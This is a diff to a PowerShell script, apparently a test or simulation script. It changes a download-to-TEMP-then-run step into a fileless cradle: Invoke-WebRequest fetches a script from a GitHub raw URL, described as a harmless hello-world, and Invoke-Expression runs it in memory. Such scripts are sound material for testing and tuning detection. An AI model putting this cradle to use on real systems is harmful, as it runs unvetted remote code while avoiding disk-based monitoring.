@@ -23,18 +23,16 @@ Get-WinEvent -LogName System -MaxEvents 5 | Sort-Object TimeCreated -Descending 
 # Download and Execute Script
 # ----------------------------
 $scriptUrl = "https://raw.githubusercontent.com/rmadhavqh/benign-scripts/main/hello.ps1"
-$tempFile = "$env:TEMP\hello.ps1"
-
-Write-Output "[+] Downloading Hello World script from: $scriptUrl"
+Write-Output "[+] Downloading and Executing Script in Memory..."
 try {
-    Invoke-WebRequest -Uri $scriptUrl -OutFile $tempFile -ErrorAction Stop
-    Write-Output "[+] Download Successful! Loading script into memory..."
-    
-    # Read and execute script in memory
-    $scriptContent = Get-Content -Path $tempFile -Raw
+    # Download the script directly into memory
+    $scriptContent = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing | Select-Object -ExpandProperty Content
+
+    # Execute the script from memory
     Invoke-Expression $scriptContent
-    
+
     Write-Output "[+] Script executed successfully!"
 } catch {
     Write-Output "[!] Failed to download or execute script. Error: $_"
 }
+
